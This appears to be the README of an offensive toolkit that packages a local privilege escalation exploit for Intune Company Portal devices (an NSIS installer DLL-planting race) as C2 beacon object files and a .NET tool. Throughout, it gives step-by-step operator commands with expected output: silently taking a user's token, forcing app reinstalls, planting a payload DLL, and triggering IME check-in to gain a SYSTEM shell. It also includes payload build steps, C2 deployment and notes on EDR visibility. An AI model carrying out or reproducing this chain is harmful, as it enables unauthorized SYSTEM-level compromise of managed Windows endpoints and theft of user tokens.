# company-portal-lpe

BOF chain for [CVE-2025-43715](https://blog.amberwolf.com/blog/2026/october/company-portal-self-service-to-system/):
NSIS installer race condition on Intune-managed Windows devices.
Plants a DLL into the NSIS temp directory before the installer loads
its own plugins. Escalates from a user-context implant to SYSTEM.

Based on the [research](https://blog.amberwolf.com/blog/2026/october/company-portal-self-service-to-system/) and [IMEClient](https://github.com/AmberWolfCyber/IMEClient) by AmberWolf.
This repo reimplements the chain as BOFs (no .NET dependency) and adds
the WCF named pipe check-in trigger.

Three implementations are included:

| Variant | Location | Format | Async race | C2 support |
|---------|----------|--------|------------|------------|
| **COFF BOF** | `bofs/` | `.o` object files | No (blocks beacon) | CS, Sliver, Havoc, OC2 |
| **BOF-PE** | `bofs/pe/` | Linked DLLs | Yes (background job) | OC2 (Stage1) |
| **.NET** | `csharp/` | Standalone exe | N/A (single command) | Any execute-assembly loader |

## Requirements

- C2 implant on an Intune-managed Windows device (user context, x64)
- [askwam BOF](https://github.com/dirkjanm/askWAM) loaded in the agent
- A payload DLL (must be x86, see below)
- At least one NSIS-based app assigned in Company Portal

## Chain overview

```
askwam -> exchange -> apps (uninstall) -> race (arm) -> apps (install) -> checkin -> SYSTEM shell
```

Six steps. No .NET, no CLR loading. The checkin step triggers IME
re-evaluation over the local WCF named pipe so the install starts
within seconds instead of waiting for the next poll cycle (up to
60 minutes).

The BOF-PE race variant runs as an async background job, so the beacon
stays responsive while the watcher waits for NSIS temp directories.

## Step 1: Get a MAM token

Use askwam to silently request a MAM token from the logged-in user's
WAM broker. The Company Portal client ID and MAM resource are fixed
values:

```
> askwam --client-id 9ba1a5c7-f17a-4de9-a1f1-6178c8d51223 \
         --scope d4ebce55-015a-49b5-a083-c84d1797ae8c/.default
```

```
[*] Provider: https://login.microsoftonline.com/organizations
[*] Account: bob@contoso.onmicrosoft.com (aad, 72f988bf-...)
[+] Token (1847 chars):
eyJ0eXAiOi...
```

Save the token. It expires in minutes.

## Step 2: Exchange for an enrollment token

The exchange BOF swaps the MAM token for an Intune enrollment token.
It auto-discovers the IWService host from IME logs and the device ID
from the MDM enrollment certificate.

COFF BOF:
```
> intune-exchange <mam-token>
```

BOF-PE:
```
> intune-exchange-pe <mam-token>
```

```
[*] Discovered host: fef.amsub0302.manage.microsoft.com
[*] GET https://fef.amsub0302.manage.microsoft.com/OAuth/StatelessOAuthService/OAuthProxy/?api-version=1.0
[+] Enrollment token (1847 chars):
eyJ0eXAiOi...

[*] IWService URL: https://fef.amsub0302.manage.microsoft.com/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService
[*] Device ID: 6b8e49c0-b8b5-4266-a5ab-9f13d4d7841b

[*] Next: intune-apps <token> list
```

If host discovery fails (the regex only matches `fef.*` in IME logs),
pass `--host`:

```
> intune-exchange <mam-token> --host agents.amsub0502.manage.microsoft.com
```

## Step 3: List apps and find an NSIS target

List the apps assigned to the device:

COFF BOF:
```
> intune-apps <enrollment-token> list
```

BOF-PE:
```
> intune-apps-pe <enrollment-token> list
```

```
[*] Discovered host: fef.amsub0302.manage.microsoft.com
[*] Device ID: 6b8e49c0-b8b5-4266-a5ab-9f13d4d7841b
[*] Applications:
  #   AppId                                  Name                           Publisher
  --------------------------------------------------------------------------
  1   35847c11-31b8-41cd-9440-d2114c55a8f2   7-Zip                          Igor Pavlov
  6   d3ebcd65-58f0-4d26-aa65-c5685d0754bd   Google Chrome                  Google
  29  101bb1e7-7a36-4eb6-b5f4-a6d2f8dffc21   VLC Media Player               Videolan

[*] 29 app(s)
```

Identify which apps use NSIS. Save the list output to a file and run
`nsis_lookup.py` against it:

```
$ python3 nsis_lookup.py --file apps-output.txt

[*] Parsed 29 app name(s), checking NSIS database...

  VLC Media Player
    -> VideoLAN.VLC                            NSIS 3.09-4  arm64  CVE-2025-43715

[*] 1 app(s) matched NSIS entries with CVEs.
```

You can also pipe the output directly:

```
$ cat apps-output.txt | python3 nsis_lookup.py --stdin
```

Or look up individual apps by name:

```
$ python3 nsis_lookup.py vlc

"vlc" (3 match(es)):
  VideoLAN.VLC                            NSIS 3.09-4  arm64  CVE-2025-43715
```

The full winget NSIS database is also browsable at
https://amberwolfcyber.github.io/winget-stats/.

## Step 4: Uninstall the target app

If the target app is already installed, uninstall it first so Intune
queues it for reinstall:

COFF BOF:
```
> intune-apps <enrollment-token> uninstall 101bb1e7-7a36-4eb6-b5f4-a6d2f8dffc21
```

BOF-PE:
```
> intune-apps-pe <enrollment-token> uninstall 101bb1e7-7a36-4eb6-b5f4-a6d2f8dffc21
```

```
[*] Looking up Uninstall action for 101bb1e7-7a36-4eb6-b5f4-a6d2f8dffc21...
[*] Uninstall target found, POSTing...
[+] Uninstall succeeded (HTTP 204)
```

## Step 5: Arm the race and trigger install

Arm the filesystem watcher. This must be running before the install
starts. Upload the payload DLL through the C2 file selector (OC2) or
pass it from the team server (CS):

COFF BOF (OC2, blocks beacon until timeout):
```
> intune-race --timeout 300
   (upload payload_test.dll via file selector)
```

BOF-PE (OC2, runs as async background job):
```
> intune-race-pe --timeout 300
   (upload payload_test.dll via file selector)
```

Cobalt Strike:
```
> intune-race /opt/payloads/payload_test.dll nsExec.dll 300
```

```
[*] Payload loaded: 15886 bytes. Plugin: nsExec.dll. Timeout: 300 s.
[*] Watching C:\Windows\Temp for NSIS temp dirs (ns*.tmp)...
```

The BOF-PE race variant is async: the beacon keeps checking in and
accepting commands while the watcher runs. Use `--timeout 0` for
infinite monitoring. Stop the job with `task stop <job-id>`.

In a second session (or in the same session with the async BOF-PE),
trigger the install:

```
> intune-apps <enrollment-token> install 101bb1e7-7a36-4eb6-b5f4-a6d2f8dffc21
```

```
[*] Looking up Install action for 101bb1e7-7a36-4eb6-b5f4-a6d2f8dffc21...
[*] Install target found, POSTing...
[+] Install succeeded (HTTP 204)
```

## Step 6: Trigger IME check-in

The install request is queued on the Intune backend, but IME on the
device does not know about it until it checks in. Without this step
you wait for the next poll cycle (up to 60 minutes). The checkin BOF
calls `IStatusService.CheckIn` and `IStatusService.AvailableAppCheckIn`
over the local WCF named pipe to trigger re-evaluation immediately:

COFF BOF:
```
> intune-checkin
```

BOF-PE:
```
> intune-checkin-pe
```

```
[+] Resolved Global\net.pipe://+/INTUNEMANAGEMENTEXTENSION/STATUSSERVICE/ -> \\.\pipe\e5f893ef-...
[+] Authenticated (package: NTLM)
[+] CheckIn: got CheckInResponse (142 bytes)
[+] Authenticated (package: NTLM)
[+] AvailableAppCheckIn: got AvailableAppCheckInResponse (166 bytes)
[*] Done: 2 of 2 call(s) succeeded
```

IME starts downloading and installing the app within seconds. The
race watcher (step 5) catches the NSIS temp directory deletion and
plants the payload:

```
[+] Planted nsExec.dll into C:\Windows\Temp\nsi4B92.tmp (hit #1)
[+] Planted nsExec.dll into C:\Windows\Temp\nsi4B92.tmp (hit #2)
[+] Planted nsExec.dll into C:\Windows\Temp\nsi4B92.tmp (hit #3)
[*] Done. Successful plants: 3
```

The payload DLL runs as SYSTEM when NSIS loads it.

## Passive variant

If you do not need to trigger a specific app install, the chain reduces
to just the race BOF. Any NSIS installer on the system triggers it,
whether the user started it from Company Portal, Intune pushed it, or
someone ran it manually:

COFF BOF (OC2):
```
> intune-race --timeout 600
   (upload payload_test.dll via file selector)
```

BOF-PE (OC2, async):
```
> intune-race-pe --timeout 0
   (upload payload_test.dll via file selector)
```

CS:
```
> intune-race /opt/payloads/payload_test.dll nsExec.dll 600
```

## BOF-PE variant

The `bofs/pe/` directory contains BOF-PE versions of all four BOFs.
BOF-PEs are fully linked DLLs instead of COFF object files. They use
standard Windows API imports (no DFR macros), support full C/C++, and
avoid the OC2 COFF loader quirks documented below (`.bss` not backed,
DFR thunk corruption, `MSVCRT$free` crashes).

The race BOF-PE is async: it runs as a background job using the
[Outflank async BOF spec](https://www.outflank.nl/blog/2025/07/16/async-bofs-wake-me-up-before-you-go-go/)
(`BeaconGetStopJobEvent` / `BeaconWakeup`), so the beacon stays
responsive while the watcher monitors for NSIS directories.

BOF-PE commands on OC2:

| BOF-PE | S1 command | Args |
|--------|-----------|------|
| exchange | `intune-exchange-pe` | `<mam_token> [--host <host>]` |
| apps | `intune-apps-pe` | `<token> <list\|status\|install\|uninstall> [app_guid] [--host <host>]` |
| race | `intune-race-pe` | `[--timeout 300]` + file upload (async) |
| checkin | `intune-checkin-pe` | `[both\|checkin\|available]` (default: both) |

### Build (BOF-PE)

Requires `mingw-w64` cross-compilers and CMake:

```
cd bofs/pe
cmake -B build-x64 -DCMAKE_TOOLCHAIN_FILE=cmake/mingw-x64.cmake
cmake --build build-x64
cmake --install build-x64 --prefix dist

cmake -B build-x86 -DCMAKE_TOOLCHAIN_FILE=cmake/mingw-x86.cmake
cmake --build build-x86
cmake --install build-x86 --prefix dist
```

Output:
- `dist/pe/*.o` -- prebuilt DLLs named for OC2's BOF-PE loader
- `dist/ost/*.s1.py` -- OC2 Stage1 wrapper scripts
- `dist/x64/`, `dist/x86/` -- standalone builds with `beacon.dll` for testing

Deploy to OC2:
```
rsync -av dist/pe/ dist/ost/ <c2-host>:/opt/oc2/shared/bofs/custom/dist/
```

## COFF BOF variant

The `bofs/` directory contains the original COFF BOF implementations.
These are standard `.o` object files that work with Cobalt Strike,
Sliver, Havoc, and OC2.

### Build (COFF BOF)

```
cd bofs/
make
```

Requires `mingw-w64` cross-compilers.

### COFF BOF arguments

| BOF | S1 command | Args |
|-----|-----------|------|
| exchange | `intune-exchange` | `<mam_token> [--host <host>]` |
| apps | `intune-apps` | `<token> <list\|status\|install\|uninstall> [app_guid] [--host <host>]` |
| race | `intune-race` | `[--plugin nsExec.dll] [--timeout 300]` + file upload |
| checkin | `intune-checkin` | `[--stage N]` (default 6 = full run) |

Raw BOF arg encoding (for non-S1 loaders):

| BOF | Format | Fields |
|-----|--------|--------|
| exchange | `zz` | mam_token, host_override |
| apps | `zzzz` | token, command, app_guid, host_override |
| race | `bzi` | payload_dll_bytes, plugin_name, timeout_sec |
| checkin | `zi` | operation ("checkin", "available", or "both"), stage |

Cobalt Strike: load `bofs/intune.cna`.

## .NET alternative

`csharp/CompanyPortalRecon.exe` is a standalone .NET executable that
implements the same chain without BOFs. It uses WCF for the named pipe
check-in (the native WCF client, not a manual protocol implementation)
and `FileSystemWatcher` for the race condition.

Commands:

| Command | Description |
|---------|-------------|
| `list` | Enumerate apps from IME logs on disk (no token needed) |
| `exchange --mam-token <tok>` | MAM to enrollment token exchange |
| `apps --token <tok>` | List apps from IWService API |
| `status --token <tok> <guid>` | Detailed status and actions for one app |
| `install --token <tok> <guid>` | Trigger install (add `--checkin` to force IME sync) |
| `uninstall --token <tok> <guid>` | Trigger uninstall |
| `checkin` | Force IME check-in via named pipe |
| `race <dll> --token <tok> --app <guid>` | Combined race + install + checkin in one command |

The `race` command combines steps 4 through 6 into a single operation:
it arms the filesystem watcher, triggers the install, forces a
check-in, and waits for the NSIS installer to unpack.

Build:

```
cd csharp/
dotnet publish -c Release -r win-x64 --self-contained false
```

Trade-offs compared to the BOF chain:

- Requires .NET on the target (present on Intune-managed devices).
- Loads the CLR into the agent process, which is more visible to EDR.
- The `race` command is a single step instead of six.
- The `list` command reads IME logs locally without needing a token.
- WCF handles the named pipe protocol natively, avoiding the OC2
  loader compatibility issues documented below.

## Payload DLL

The same payload DLL works with all three implementations. The race
condition is in NSIS, not in the tooling that plants the file.

The payload must be x86 (32-bit). NSIS is a 32-bit framework and loads
plugins with `LoadLibrary` into its own process.

Use `payloads/payload_test.c` for the first validation run. It writes
`C:\Windows\Temp\race_won.txt` synchronously from `DllMain`, then writes a
second entry if NSIS calls `Exec`, `ExecToLog`, or `ExecToStack`. This separates
a successful DLL load from a successful plug-in call.

Do not start an unpinned worker thread from `DllMain`. If NSIS cannot resolve
the requested export, it can unload the DLL before that thread runs. Long-running
payload logic should run synchronously from an exported plug-in callback or hold
an explicit module reference for the lifetime of its worker.

`payloads/payload_cmd.c` spawns a SYSTEM cmd.exe on the interactive
desktop. It pins the DLL with `GetModuleHandleExW(PIN)` so NSIS
cannot unload it before the worker thread runs, duplicates the process
token with `SetTokenInformation(TokenSessionId)` to target the user's
session, and uses `CREATE_BREAKAWAY_FROM_JOB` so cmd.exe survives
NSIS's job object.

Compile:

```
cd payloads/
i686-w64-mingw32-gcc -shared -o payload_test.dll payload_test.c -lkernel32
i686-w64-mingw32-strip payload_test.dll

i686-w64-mingw32-gcc -shared -o payload_cmd.dll payload_cmd.c \
    -lkernel32 -ladvapi32 -lwtsapi32
i686-w64-mingw32-strip payload_cmd.dll
```

## Files

```
├── bofs/                          # COFF BOF chain
│   ├── Makefile
│   ├── intune.cna                 # Cobalt Strike aggressor script
│   ├── common/
│   │   ├── beacon.h               # CS/Sliver/Havoc BOF API
│   │   └── bofdefs.h              # DFR declarations
│   ├── exchange/                  # MAM -> enrollment token exchange
│   ├── apps/                      # App list/status/install/uninstall
│   ├── race/                      # NSIS race filesystem watcher
│   └── checkin/                   # IME WCF named pipe check-in trigger
├── bofs/pe/                       # BOF-PE chain (linked DLLs)
│   ├── CMakeLists.txt
│   ├── cmake/                     # MinGW cross-compile toolchain files
│   ├── beacon/                    # beacon.dll (standalone test harness)
│   ├── common/                    # Shared code (discovery, HTTP, PE headers)
│   ├── exchange/                  # exchange BOF-PE
│   ├── apps/                      # apps BOF-PE
│   ├── race/                      # race BOF-PE (async)
│   ├── checkin/                   # checkin BOF-PE
│   ├── link.ld, link32.ld        # Linker scripts (x64, x86)
│   └── dist/
│       ├── pe/                    # Prebuilt DLLs (*.x64.o, *.x86.o)
│       └── ost/                   # OC2 Stage1 wrapper scripts
├── csharp/                        # .NET alternative (single exe)
│   ├── Program.cs
│   └── CompanyPortalRecon.csproj
├── payloads/                      # Native C payload sources
│   ├── payload_cmd.c              # SYSTEM -> user cmd.exe
│   ├── payload_test.c             # Minimal test payload
│   └── intune_app.c               # Standalone app management exe
├── nsis_lookup.py                 # NSIS vulnerability triage
├── scripts/
│   └── vlc-force-uninstall.ps1    # Force-remove VLC + clear IME cache
└── winget-stats/                  # NSIS database (git submodule)
```

## OC2 COFF loader compatibility

The COFF BOFs work on standard Cobalt Strike and Sliver BOF loaders
without changes. OC2's BOF loader has several quirks that required
workarounds in the COFF checkin and race BOFs. The BOF-PE variants
avoid all of these issues because they are linked DLLs with standard
imports.

### .bss section not backed

OC2 does not allocate memory for the `.bss` section. Any zero-initialized
global or static variable lands in `.bss` by default, and the first write
to it faults. Fix: force globals into `.data` with
`__attribute__((section(".data")))`. The `BOF_DATA` macro in checkin.c
does this.

### DFR thunks corrupt 5th+ stack arguments

OC2's DFR (Dynamic Function Resolution) thunk code corrupts arguments
passed on the stack (the 5th argument and beyond in the x64 calling
convention). This affects any Win32 API with 5 or more parameters.
Known affected functions:

- `CreateFileW` (7 args): `dwCreationDisposition` gets corrupted
- `WriteFile` / `ReadFile` (5 args): `lpOverlapped` gets corrupted

Fix: resolve these functions via `GetProcAddress` at runtime and call
through raw function pointers instead of DFR macros. See the `g_api`
struct and `resolve_apis()` in checkin.c for the pattern.

### MSVCRT$free crashes

`MSVCRT$free` through DFR crashes in OC2. The root cause is not fully
understood, but it is reproducible: calling `bof_free()` on a pointer
returned by `bof_realloc()` kills the process. The crash does not
happen in other BOF loaders.

Fix: do not free heap allocations in cleanup. A BOF runs once inside
an existing process, and the CRT heap is process-scoped, so leaked
allocations are reclaimed when the process exits or the next BOF
reuses the heap. The same applies to handles (CloseHandle also crashes
after overlapped pipe I/O in OC2).

### BeaconPrintf output lost on crash

OC2 buffers BeaconPrintf output and sends it back to the operator when
the BOF returns. If the BOF crashes, the buffer is lost. For crash
debugging, write markers to a file on disk instead:

```c
HANDLE hF = CreateFileW(L"C:\\Windows\\Temp\\debug.txt",
    FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
WriteFile(hF, msg, len, &written, NULL);
FlushFileBuffers(hF);
CloseHandle(hF);
```

Use `KERNEL32$WriteFile` (the raw DFR import with NULL for
lpOverlapped) for this, not `bof_WriteFile` (which routes through
the GetProcAddress-resolved pointer for overlapped I/O).

## IME cache and reinstall cycle

IME caches app detection state in the registry. After an uninstall,
Company Portal may still show the app as "Installed" until the cache
is cleared and IME re-evaluates.

To force a clean re-evaluation:

1. Stop the IME service.
2. Clear the cached state under
   `HKLM:\SOFTWARE\Microsoft\IntuneManagementExtension\` (Win32Apps,
   OperationalState, Reporting, Win32Apps_GRS, SideCarPolicies).
3. Start the IME service.
4. Wait for the startup delay (about 33 seconds before Win32App
   evaluation begins).

`scripts/vlc-force-uninstall.ps1` automates this for VLC. Adapt it
for other apps by changing the file paths and registry display-name
filter.

After clearing the cache, use the checkin BOF (step 6) to trigger
immediate re-evaluation instead of waiting for the next poll cycle.
